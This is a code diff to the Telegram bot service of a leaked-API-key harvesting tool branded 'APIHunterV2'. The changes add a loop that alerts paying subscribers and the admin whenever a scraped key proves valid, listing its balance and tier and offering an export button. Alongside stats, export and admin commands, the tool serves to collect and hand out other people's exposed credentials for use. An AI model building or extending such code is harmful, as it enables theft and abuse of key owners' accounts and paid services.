@@ -12,7 +12,6 @@ using System.Text;
 using System.Net.Http;
 using Microsoft.EntityFrameworkCore;
 using Telegram.Bot.Types.ReplyMarkups;
-using UnsecuredAPIKeys.Services;
 
 namespace UnsecuredAPIKeys.Services.Telegram;
 
@@ -73,97 +72,128 @@ public class TelegramBotService : BackgroundService
             cancellationToken: stoppingToken
         );
 
-        // Set bot commands menu and notify admin with resilience
-        try
+        // Set bot commands menu
+        await _botClient.SetMyCommands(new[]
         {
-            await _botClient.SetMyCommands(new[]
-            {
-                new BotCommand { Command = "status", Description = "Mission Control" },
-                new BotCommand { Command = "stats", Description = "Statistics" },
-                new BotCommand { Command = "start_scraper", Description = "Start Scraper" },
-                new BotCommand { Command = "start_verifier", Description = "Start Verifier" },
-                new BotCommand { Command = "valid_keys", Description = "Valid Keys" },
-                new BotCommand { Command = "export", Description = "Export Data" },
-                new BotCommand { Command = "help", Description = "Show Commands" }
-            }, cancellationToken: stoppingToken);
+            new BotCommand { Command = "status", Description = "Mission Control" },
+            new BotCommand { Command = "stats", Description = "Statistics" },
+            new BotCommand { Command = "start_scraper", Description = "Start Scraper" },
+            new BotCommand { Command = "start_verifier", Description = "Start Verifier" },
+            new BotCommand { Command = "valid_keys", Description = "Valid Keys" },
+            new BotCommand { Command = "export", Description = "Export Data" },
+            new BotCommand { Command = "help", Description = "Show Commands" }
+        }, cancellationToken: stoppingToken);
 
-            // Notify admin that bot is online
-            if (_adminChatId != 0)
+        // Notify admin that bot is online
+        if (_adminChatId != 0)
+        {
+            await _botClient.SendMessage(
+                chatId: _adminChatId,
+                text: "<b>💎 APIHunterV2 Dashboard Online</b>\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n<i>Satellite connection established.</i>",
+                parseMode: ParseMode.Html,
+                cancellationToken: stoppingToken);
+        }
+
+        // Live Notification Loop
+        var lastCheck = DateTime.UtcNow;
+        while (!stoppingToken.IsCancellationRequested)
+        {
+            try
             {
-                await _botClient.SendMessage(
-                    chatId: _adminChatId,
-                    text: "<b>💎 APIHunterV2 Dashboard Online</b>\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n<i>Satellite connection established.</i>",
-                    parseMode: ParseMode.Html,
-                    cancellationToken: stoppingToken);
+                await Task.Delay(TimeSpan.FromSeconds(30), stoppingToken);
+
+                if (_adminChatId == 0) continue;
+
+                using var scope = _serviceProvider.CreateScope();
+                var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
+
+                var newValidKeys = await dbContext.APIKeys
+                    .Where(k => (k.Status == ApiStatusEnum.Valid || k.Status == ApiStatusEnum.ValidNoCredits) && k.LastCheckedUTC > lastCheck)
+                    .OrderBy(k => k.LastCheckedUTC)
+                    .ToListAsync(stoppingToken);
+
+                if (newValidKeys.Any())
+                {
+                    foreach (var key in newValidKeys)
+                    {
+                        var statusStr = key.Status == ApiStatusEnum.Valid ? "✅ VALID" : "⚠️ QUOTA EXCEEDED";
+                        var colorIcon = key.Status == ApiStatusEnum.Valid ? "🟢" : "🟡";
+                        
+                        var sb = new StringBuilder();
+                        sb.AppendLine($"{colorIcon} <b>NEW {key.ApiType.ToString().ToUpper()} KEY FOUND</b>");
+                        sb.AppendLine("⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯");
+                        sb.AppendLine($"<b>Status:</b> <code>{statusStr}</code>");
+                        
+                        if (!string.IsNullOrEmpty(key.AccountTier))
+                            sb.AppendLine($"<b>Tier:</b>   <code>{key.AccountTier}</code>");
+                            
+                        if (!string.IsNullOrEmpty(key.Balance))
+                            sb.AppendLine($"<b>Value:</b>  <code>{key.Balance}</code>");
+
+                        sb.AppendLine($"<b>Key:</b>    <code>{key.ApiKey.Substring(0, Math.Min(12, key.ApiKey.Length))}...</code>");
+                        sb.AppendLine("⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯");
+                        
+                        var keyboard = new InlineKeyboardMarkup(new[]
+                        {
+                            new [] { InlineKeyboardButton.WithCallbackData("📂 Export Intelligence", $"export_key:{key.Id}") }
+                        });
+
+                        // Notify owner or super admin
+                        var targetChatId = key.DiscoveredByTelegramId ?? _adminChatId;
+                        if (targetChatId != 0)
+                        {
+                            await _botClient.SendMessage(
+                                chatId: targetChatId,
+                                text: sb.ToString(),
+                                parseMode: ParseMode.Html,
+                                replyMarkup: keyboard,
+                                cancellationToken: stoppingToken);
+                        }
+                        
+                        // If key is not owned by super admin, also notify super admin (optional, for monitoring)
+                        if (targetChatId != _adminChatId && _adminChatId != 0)
+                        {
+                             await _botClient.SendMessage(
+                                chatId: _adminChatId,
+                                text: $"<i>[Monitor] New key found by user {targetChatId}:</i>\n{sb}",
+                                parseMode: ParseMode.Html,
+                                cancellationToken: stoppingToken);
+                        }
+                    }
+                    lastCheck = newValidKeys.Max(k => k.LastCheckedUTC) ?? lastCheck;
+                }
             }
-        }
-        catch (Exception ex)
-        {
-            _logger.LogError(ex, "Failed to initialize Telegram Bot commands or notify admin. The bot will still attempt to receive updates.");
-        }
-
-        // Keep the service alive without notifications
-        try
-        {
-            await Task.Delay(Timeout.Infinite, stoppingToken);
-        }
-        catch (OperationCanceledException)
-        {
-            // Normal shutdown
+            catch (Exception ex)
+            {
+                _logger.LogError(ex, "Error in Telegram notification loop");
+            }
         }
     }
 
     private async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
     {
-        // Offload processing to a background task to keep the polling loop responsive and prevent callback timeouts
-        _ = Task.Run(async () =>
-        {
-            try
-            {
-                await ProcessUpdateAsync(botClient, update, cancellationToken);
-            }
-            catch (Exception ex)
-            {
-                _logger.LogError(ex, "Error processing Telegram update {UpdateId}", update.Id);
-            }
-        }, cancellationToken);
-    }
-
-    private async Task ProcessUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
-    {
         long chatId = 0;
         string? messageText = null;
         string? callbackData = null;
-        User? fromUser = null;
 
         if (update.Message is { Text: { } text })
         {
             chatId = update.Message.Chat.Id;
             messageText = text;
-            fromUser = update.Message.From;
         }
         else if (update.CallbackQuery is { Data: { } data, Message: { } msg })
         {
             chatId = msg.Chat.Id;
             callbackData = data;
-            fromUser = update.CallbackQuery.From;
         }
 
         if (chatId == 0) return;
-
+ 
         using var scope = _serviceProvider.CreateScope();
         var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
         
         // Authorization Logics
         var user = await dbContext.TelegramSubscribers.FindAsync(new object[] { chatId }, cancellationToken);
-
-        // Sync Username
-        if (user != null && fromUser != null && fromUser.Username != null && user.Username != fromUser.Username)
-        {
-            user.Username = fromUser.Username;
-            await dbContext.SaveChangesAsync(cancellationToken);
-        }
-
         var isSuperAdmin = _adminChatId != 0 && chatId == _adminChatId;
         var hasActiveSub = user != null && user.SubscriptionExpiryUtc > DateTime.UtcNow;
         var isAdmin = isSuperAdmin || (user != null && user.IsAdmin);
@@ -296,6 +326,9 @@ public class TelegramBotService : BackgroundService
                 case "/purge":
                     await HandlePurgeCommand(chatId, isAdmin, cancellationToken);
                     break;
+                case "/purge_junk":
+                    if (isAdmin) await HandlePurgeJunkCommand(chatId, cancellationToken);
+                    break;
                 case "/user_dash":
                     if (isAdmin)
                     {
@@ -340,97 +373,18 @@ public class TelegramBotService : BackgroundService
                         var httpClientFactory = scope.ServiceProvider.GetRequiredService<IHttpClientFactory>();
                         var scraper = new ScraperService(dbContext, httpClientFactory);
                         await scraper.RunScrapeByGroupAsync(groupName, isDeep, chatId, ct);
-                    }, chatId);
+                    });
  
-                await _botClient.SendMessage(chatId, $"🚀 Scraper started for *{groupName}* ({mode} mode)!\nJob ID: `{jobId}`", parseMode: ParseMode.Markdown, cancellationToken: cancellationToken);
-                }
-            }
-            else if (callbackData.StartsWith("user_dash:"))
-            {
-                var targetId = long.Parse(callbackData.Split(':')[1]);
-                await HandleUserDashCommand(chatId, targetId, cancellationToken);
-            }
-            else if (callbackData.StartsWith("admin_scrape:"))
-            {
-                var targetId = long.Parse(callbackData.Split(':')[1]);
-                await HandleAdminStartScraperCommand(chatId, targetId, cancellationToken);
-            }
-            else if (callbackData.StartsWith("admin_run_scrape:"))
-            {
-                var parts = callbackData.Split(':');
-                var targetId = long.Parse(parts[1]);
-                var groupName = parts[2];
-                var mode = parts[3];
-                var isDeep = mode == "deep";
-
-                _jobManager.StartJob($"Scraper-{groupName}-{targetId}", async (ct) =>
-                {
-                    using var scope = _serviceProvider.CreateScope();
-                    var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
-                    var httpClientFactory = scope.ServiceProvider.GetRequiredService<IHttpClientFactory>();
-                    var scraper = new ScraperService(dbContext, httpClientFactory);
-                    await scraper.RunScrapeByGroupAsync(groupName, isDeep, targetId, ct);
-                }, targetId);
-
-                await _botClient.SendMessage(chatId, $"🚀 [Admin] Scraper started for @{targetId} group *{groupName}*!", parseMode: ParseMode.Markdown, cancellationToken: cancellationToken);
-            }
-            else if (callbackData.StartsWith("admin_tokens:"))
-            {
-                var targetId = long.Parse(callbackData.Split(':')[1]);
-                await HandleListTokensCommand(chatId, false, cancellationToken, targetId);
-            }
-            else if (callbackData.StartsWith("admin_stats:"))
-            {
-                var targetId = long.Parse(callbackData.Split(':')[1]);
-                await HandleStatsCommand(chatId, false, cancellationToken, targetId);
-            }
-            else if (callbackData.StartsWith("admin_export:"))
-            {
-                var targetId = long.Parse(callbackData.Split(':')[1]);
-                await HandleExportCommand(chatId, "csv", false, cancellationToken, targetId);
-            }
-            else if (callbackData.StartsWith("admin_sub_manage:"))
-            {
-                var targetId = long.Parse(callbackData.Split(':')[1]);
-                await HandleAdminSubManageCommand(chatId, targetId, cancellationToken);
-            }
-            else if (callbackData.StartsWith("admin_sub_ext:"))
-            {
-                var parts = callbackData.Split(':');
-                var targetId = long.Parse(parts[1]);
-                var days = int.Parse(parts[2]);
-                
-                using (var scope = _serviceProvider.CreateScope())
-                {
-                    var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
-                    var userS = await dbContext.TelegramSubscribers.FindAsync(new object[] { targetId }, cancellationToken);
-                    if (userS != null)
-                    {
-                        var baseDate = userS.SubscriptionExpiryUtc > DateTime.UtcNow ? userS.SubscriptionExpiryUtc : DateTime.UtcNow;
-                        userS.SubscriptionExpiryUtc = baseDate.AddDays(days);
-                        await dbContext.SaveChangesAsync(cancellationToken);
-                        await _botClient.SendMessage(chatId, $"✅ Extended subscription for <code>{targetId}</code> by {days} days.", parseMode: ParseMode.Html, cancellationToken: cancellationToken);
-                        await HandleUserDashCommand(chatId, targetId, cancellationToken);
-                    }
+                    await _botClient.SendMessage(chatId, $"🚀 Scraper started for *{groupName}* ({mode} mode)!\nJob ID: `{jobId}`", parseMode: ParseMode.Markdown, cancellationToken: cancellationToken);
                 }
             }
             else if (callbackData == "status_refresh")
             {
                 await HandleStatusCommand(chatId, isAdmin, cancellationToken);
             }
-            else if (callbackData.StartsWith("admin_list_subs"))
-            {
-                await HandleListSubsCommand(chatId, cancellationToken);
-            }
             else if (callbackData == "jobs_list")
             {
-                var jobsQuery = _jobManager.GetAllJobs().Where(j => j.Status == "Running");
-                if (!isAdmin)
-                {
-                    jobsQuery = jobsQuery.Where(j => j.OwnerTelegramId == chatId);
-                }
-                var jobs = jobsQuery.ToList();
-
+                var jobs = _jobManager.GetAllJobs().Where(j => j.Status == "Running").ToList();
                 if (!jobs.Any())
                 {
                     await _botClient.SendMessage(chatId, "No active jobs running.", cancellationToken: cancellationToken);
@@ -447,7 +401,10 @@ public class TelegramBotService : BackgroundService
             }
             else if (callbackData == "purge_junk")
             {
-                await HandlePurgeCommand(chatId, isAdmin, cancellationToken);
+                if (isAdmin)
+                {
+                    await HandlePurgeJunkCommand(chatId, cancellationToken);
+                }
             }
         }
         catch (Exception ex)
@@ -515,12 +472,16 @@ public class TelegramBotService : BackgroundService
             help.AppendLine("└ /toggle_query &lt;id&gt; - Toggle a query");
         }
  
-        help.AppendLine();
-        help.AppendLine("💾 <b>Data</b>");
-        help.AppendLine("├ /valid_keys - Count of valid keys");
-        help.AppendLine("├ /export [csv|json] - Get keys file");
-        if (isAdmin) help.AppendLine("├ /purge - Clean junk records");
-        if (isAdmin) help.AppendLine("└ /reset_database CONFIRM_RESET - Wipe DB");
+        if (isAdmin)
+        {
+            help.AppendLine();
+            help.AppendLine("💾 <b>Data</b>");
+            help.AppendLine("├ /valid_keys - Count of valid keys");
+            help.AppendLine("├ /export [csv|json] - Get keys file");
+            help.AppendLine("├ /purge - Clean junk records (Master)");
+            help.AppendLine("├ /purge_junk - Purge references for invalid keys (Optimization)");
+            help.AppendLine("└ /reset_database CONFIRM_RESET - Wipe DB");
+        }
  
         help.AppendLine();
         help.AppendLine("📡 <b>Ghost Node</b>");
@@ -539,41 +500,22 @@ public class TelegramBotService : BackgroundService
         await _botClient.SendMessage(chatId, help.ToString(), parseMode: ParseMode.Html, cancellationToken: ct);
     }
 
-    private async Task HandleStatusCommand(long chatId, bool isAdmin, CancellationToken ct, long? targetUserId = null)
+    private async Task HandleStatusCommand(long chatId, bool isAdmin, CancellationToken ct)
     {
         using var scope = _serviceProvider.CreateScope();
         var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
         var dbService = scope.ServiceProvider.GetRequiredService<DatabaseService>();
         
-        // Filter by targetUserId if provided, or by chatId if not admin
-        long? filterBy = targetUserId ?? (isAdmin ? null : chatId);
+        // Filter by chatId if not admin
+        long? filterBy = isAdmin ? null : chatId;
         var stats = await dbService.GetCategorizedStatisticsAsync(dbContext, filterBy);
-        
-        var jobsQuery = _jobManager.GetAllJobs().Where(j => j.Status == "Running");
-        if (!isAdmin)
-        {
-            jobsQuery = jobsQuery.Where(j => j.OwnerTelegramId == chatId);
-        }
-        var activeJobs = jobsQuery.ToList();
+        var activeJobs = _jobManager.GetAllJobs().Where(j => j.Status == "Running").ToList();
 
         var sb = new StringBuilder();
         sb.AppendLine("<b>📡 SATELLITE STATUS</b>");
         sb.AppendLine("⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯");
         
-        double validPercent = stats.TotalKeys > 0 ? (double)stats.ValidKeys / stats.TotalKeys : 0;
-        sb.AppendLine($"<b>Health Index:</b> {GetProgressBar(validPercent)} {validPercent:P0}");
-        sb.AppendLine();
-
-        sb.AppendLine($"<b>Total Keys:</b> <code>{stats.TotalKeys}</code>");
-        sb.AppendLine($"<b>🟢 Valid:</b> <code>{stats.ValidKeys}</code>");
-        sb.AppendLine($"<b>🔴 Invalid:</b> <code>{stats.InvalidKeys}</code>");
-        sb.AppendLine($"<b>⏳ Hidden:</b> <code>{stats.UnverifiedKeys}</code>");
-        sb.AppendLine();
-
-        sb.AppendLine($"<b>🔑 Tokens:</b> <code>{stats.GitHubTokensCount} active</code>");
-        sb.AppendLine($"<b>🏃 Jobs:</b> <code>{activeJobs.Count} running</code>");
-        
-        // Database Health Section
+        // 1. Database Health Section (Top)
         sb.AppendLine();
         sb.AppendLine("<b>💾 DATABASE HEALTH (Supabase)</b>");
         double dbSizeMb = stats.DatabaseSizeBytes / (1024.0 * 1024.0);
@@ -583,11 +525,22 @@ public class TelegramBotService : BackgroundService
         string dbSizeStr = dbSizeMb > 1024 ? $"{(dbSizeMb / 1024.0):F2} GB" : $"{dbSizeMb:F2} MB";
         sb.AppendLine($"<b>Storage:</b> {GetProgressBar(dbUsagePercent)} {dbUsagePercent:P1}");
         sb.AppendLine($"<b>Used:</b> <code>{dbSizeStr} / {dbLimitMb} MB</code>");
+        sb.AppendLine();
+
+        // 2. Key Statistics (Bottom)
+        double validPercent = stats.TotalKeys > 0 ? (double)stats.ValidKeys / stats.TotalKeys : 0;
+        sb.AppendLine($"<b>Health Index:</b> {GetProgressBar(validPercent)} {validPercent:P0}");
+        sb.AppendLine($"<b>Total Keys:</b> <code>{stats.TotalKeys}</code>");
+        sb.AppendLine($"<b>🟢 Valid:</b> <code>{stats.ValidKeys}</code>");
+        sb.AppendLine($"<b>🔴 Invalid:</b> <code>{stats.InvalidKeys}</code>");
+        sb.AppendLine($"<b>⏳ Hidden:</b> <code>{stats.UnverifiedKeys}</code>");
+        sb.AppendLine();
+
+        sb.AppendLine($"<b>🔑 Tokens:</b> <code>{stats.GitHubTokensCount} active</code>");
+        sb.AppendLine($"<b>🏃 Jobs:</b> <code>{activeJobs.Count} running</code>");
 
         if (activeJobs.Any())
         {
-            sb.AppendLine();
-            sb.AppendLine("<b>🏃 Active Deployments:</b>");
             foreach (var job in activeJobs)
             {
                 sb.AppendLine($"- {job.JobType}: <code>{job.JobId}</code>");
@@ -595,23 +548,26 @@ public class TelegramBotService : BackgroundService
         }
         else
         {
-            sb.AppendLine();
             sb.AppendLine("<i>No active deployments running</i>");
         }
         
         sb.AppendLine("⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯");
         sb.AppendLine($"<i>System time: {DateTime.UtcNow.ToIst():HH:mm} IST</i>");
 
-        var keyboard = new InlineKeyboardMarkup(new[]
+        var keyboardButtons = new List<InlineKeyboardButton[]>
         {
             new [] { 
                 InlineKeyboardButton.WithCallbackData("🔄 Refresh", "status_refresh"), 
                 InlineKeyboardButton.WithCallbackData("📋 Active Jobs", "jobs_list") 
-            },
-            new [] {
-                InlineKeyboardButton.WithCallbackData("🧹 Purge Junk Sources", "purge_junk")
             }
-        });
+        };
+
+        if (isAdmin)
+        {
+           keyboardButtons.Add(new [] { InlineKeyboardButton.WithCallbackData("🧹 Purge Junk Sources", "purge_junk") });
+        }
+
+        var keyboard = new InlineKeyboardMarkup(keyboardButtons);
 
         await _botClient.SendMessage(chatId, sb.ToString(), parseMode: ParseMode.Html, replyMarkup: keyboard, cancellationToken: ct);
     }
@@ -623,14 +579,14 @@ public class TelegramBotService : BackgroundService
         return new string('█', activeBlocks) + new string('░', totalBlocks - activeBlocks);
     }
 
-    private async Task HandleStatsCommand(long chatId, bool isAdmin, CancellationToken ct, long? targetUserId = null)
+    private async Task HandleStatsCommand(long chatId, bool isAdmin, CancellationToken ct)
     {
         using var scope = _serviceProvider.CreateScope();
         var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
         var dbService = scope.ServiceProvider.GetRequiredService<DatabaseService>();
         
-        // Filter by targetUserId if provided, or by chatId if not admin
-        long? filterBy = targetUserId ?? (isAdmin ? null : chatId);
+        // Filter by chatId if not admin
+        long? filterBy = isAdmin ? null : chatId;
         var stats = await dbService.GetCategorizedStatisticsAsync(dbContext, filterBy);
 
         var sb = new StringBuilder();
@@ -751,7 +707,7 @@ public class TelegramBotService : BackgroundService
         foreach (var job in jobs.TakeLast(5))
         {
             var jobId = System.Net.WebUtility.HtmlEncode(job.JobId);
-            sb.AppendLine($"- <code>{jobId}</code>: {job.Status} (Started: {job.StartedAt.ToIst():g} IST)");
+            sb.AppendLine($"- <code>{jobId}</code>: {job.Status} (Started: {job.StartedAt})");
         }
 
         await _botClient.SendMessage(chatId, sb.ToString(), parseMode: ParseMode.Html, cancellationToken: ct);
@@ -769,14 +725,14 @@ public class TelegramBotService : BackgroundService
         await _botClient.SendMessage(chatId, sb.ToString(), parseMode: ParseMode.Html, cancellationToken: ct);
     }
 
-    private async Task HandleListTokensCommand(long chatId, bool isAdmin, CancellationToken ct, long? targetUserId = null)
+    private async Task HandleListTokensCommand(long chatId, bool isAdmin, CancellationToken ct)
     {
         using var scope = _serviceProvider.CreateScope();
         var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
         var dbService = scope.ServiceProvider.GetRequiredService<DatabaseService>();
         
-        // Filter by targetUserId if provided, or by chatId if not admin
-        long? filterBy = targetUserId ?? (isAdmin ? null : chatId);
+        // Admins see all tokens, subscribers see their own
+        long? filterBy = isAdmin ? null : chatId;
         var tokens = await dbService.GetGitHubTokensAsync(dbContext, filterBy);
 
         if (tokens.Count == 0)
@@ -947,7 +903,7 @@ public class TelegramBotService : BackgroundService
         await _botClient.SendMessage(chatId, sb.ToString(), parseMode: ParseMode.Html, cancellationToken: ct);
     }
 
-    private async Task HandleExportCommand(long chatId, string format, bool isAdmin, CancellationToken ct, long? targetUserId = null)
+    private async Task HandleExportCommand(long chatId, string format, bool isAdmin, CancellationToken ct)
     {
         string fmt = (format?.ToLower() == "json") ? "json" : "csv";
         string fileName = $"valid_keys_{DateTime.Now:yyyyMMdd_HHmmss}.{fmt}";
@@ -957,8 +913,8 @@ public class TelegramBotService : BackgroundService
         var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
         var dbService = scope.ServiceProvider.GetRequiredService<DatabaseService>();
         
-        // Filter by targetUserId if provided, or by chatId if not admin
-        long? filterBy = targetUserId ?? (isAdmin ? null : chatId);
+        // Filter by chatId if not admin
+        long? filterBy = isAdmin ? null : chatId;
         await dbService.ExportKeysAsync(dbContext, filePath, true, fmt, filterBy);
 
         using var stream = System.IO.File.OpenRead(filePath);
@@ -1005,7 +961,7 @@ public class TelegramBotService : BackgroundService
         sb.AppendLine("⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯");
         sb.AppendLine($"<b>ID:</b> <code>{chatId}</code>");
         sb.AppendLine($"<b>Status:</b> {(user.SubscriptionExpiryUtc > DateTime.UtcNow ? "🟢 Active" : "🔴 Expired")}");
-        sb.AppendLine($"<b>Expiry:</b> <code>{user.SubscriptionExpiryUtc.ToIst():yyyy-MM-dd HH:mm} IST</code>");
+        sb.AppendLine($"<b>Expiry:</b> <code>{user.SubscriptionExpiryUtc:yyyy-MM-dd HH:mm} UTC</code>");
         sb.AppendLine($"<b>Role:</b> {(user.IsAdmin ? "Admin" : "Subscriber")}");
         sb.AppendLine("⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯");
         
@@ -1036,7 +992,7 @@ public class TelegramBotService : BackgroundService
         }
 
         await dbContext.SaveChangesAsync(ct);
-        await _botClient.SendMessage(chatId, $"✅ <b>Subscription Updated</b>\nUser: <code>{targetId}</code>\nNew Expiry: <code>{user.SubscriptionExpiryUtc.ToIst():yyyy-MM-dd} IST</code>", parseMode: ParseMode.Html, cancellationToken: ct);
+        await _botClient.SendMessage(chatId, $"✅ <b>Subscription Updated</b>\nUser: <code>{targetId}</code>\nNew Expiry: <code>{user.SubscriptionExpiryUtc:yyyy-MM-dd}</code>", parseMode: ParseMode.Html, cancellationToken: ct);
         
         // Notify the user with full Ghost Node instructions
         try 
@@ -1048,7 +1004,7 @@ public class TelegramBotService : BackgroundService
 
             var msg = new StringBuilder();
             msg.AppendLine("🎊 <b>WELCOME TO THE NETWORK!</b>");
-            msg.AppendLine($"Your subscription is active until: <code>{user.SubscriptionExpiryUtc.ToIst():yyyy-MM-dd} IST</code>");
+            msg.AppendLine($"Your subscription is active until: <code>{user.SubscriptionExpiryUtc:yyyy-MM-dd}</code>");
             msg.AppendLine("⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯");
             msg.AppendLine("🚀 <b>PROPER RENDER SETUP GUIDE:</b>");
             msg.AppendLine();
@@ -1102,7 +1058,7 @@ public class TelegramBotService : BackgroundService
     {
         using var scope = _serviceProvider.CreateScope();
         var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
-        var subs = await dbContext.TelegramSubscribers.OrderByDescending(s => s.CreatedAtUtc).ToListAsync(ct);
+        var subs = await dbContext.TelegramSubscribers.ToListAsync(ct);
 
         if (!subs.Any())
         {
@@ -1111,20 +1067,13 @@ public class TelegramBotService : BackgroundService
         }
 
         var sb = new StringBuilder("<b>📋 REGISTERED USERS</b>\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n");
-        var rows = new List<InlineKeyboardButton[]>();
-
         foreach (var s in subs)
         {
             var status = s.SubscriptionExpiryUtc > DateTime.UtcNow ? "🟢" : "🔴";
-            var nameStr = !string.IsNullOrEmpty(s.Username) ? $"@{s.Username}" : $"{s.TelegramId}";
-            var label = $"{status} {nameStr} ({(s.IsAdmin ? "Admin" : "Sub")})";
-            
-            rows.Add(new[] { InlineKeyboardButton.WithCallbackData(label, $"user_dash:{s.TelegramId}") });
+            var nameStr = !string.IsNullOrEmpty(s.Username) ? $" (@{s.Username})" : "";
+            sb.AppendLine($"{status} <code>{s.TelegramId}</code>{nameStr} - {(s.IsAdmin ? "Admin" : "Sub")} (Ends: {s.SubscriptionExpiryUtc:MM/dd})");
         }
-
-        var keyboard = new InlineKeyboardMarkup(rows);
-
-        await _botClient.SendMessage(chatId, sb.ToString(), parseMode: ParseMode.Html, replyMarkup: keyboard, cancellationToken: ct);
+        await _botClient.SendMessage(chatId, sb.ToString(), parseMode: ParseMode.Html, cancellationToken: ct);
     }
 
     private async Task HandleSetAdminCommand(long chatId, string args, CancellationToken ct)
@@ -1178,8 +1127,7 @@ public class TelegramBotService : BackgroundService
         foreach (var admin in admins)
         {
             if (admin.TelegramId == _adminChatId) continue;
-            var nameStr = !string.IsNullOrEmpty(admin.Username) ? $" (@{admin.Username})" : "";
-            sb.AppendLine($"👤 Admin: <code>{admin.TelegramId}</code>{nameStr}");
+            sb.AppendLine($"👤 Admin: <code>{admin.TelegramId}</code>");
         }
         
         await _botClient.SendMessage(chatId, sb.ToString(), parseMode: ParseMode.Html, cancellationToken: ct);
@@ -1292,7 +1240,7 @@ public class TelegramBotService : BackgroundService
                     : "🔴 Offline";
                     
                 lastSeen = node.LastNodeHeartbeatUtc.HasValue 
-                    ? node.LastNodeHeartbeatUtc.ToIst()!.Value.ToString("g") + " IST"
+                    ? node.LastNodeHeartbeatUtc.Value.ToString("g") 
                     : "Never";
             }
 
@@ -1390,8 +1338,6 @@ public class TelegramBotService : BackgroundService
         await _botClient.SendMessage(chatId, $"👤 <b>Edit Subscription for:</b> <code>{targetUserId}</code>\nChoose duration to add:", parseMode: ParseMode.Html, replyMarkup: keyboard, cancellationToken: ct);
     }
 
-    #endregion
-
     private async Task HandlePurgeCommand(long chatId, bool isAdmin, CancellationToken ct)
     {
         if (!isAdmin)
@@ -1421,4 +1367,11 @@ public class TelegramBotService : BackgroundService
 
         await _botClient.EditMessageText(chatId, statusMsg.MessageId, sb.ToString(), parseMode: ParseMode.Html, cancellationToken: ct);
     }
+
+    private async Task HandlePurgeJunkCommand(long chatId, CancellationToken ct)
+    {
+        await HandlePurgeCommand(chatId, true, ct);
+    }
+
+    #endregion
 }
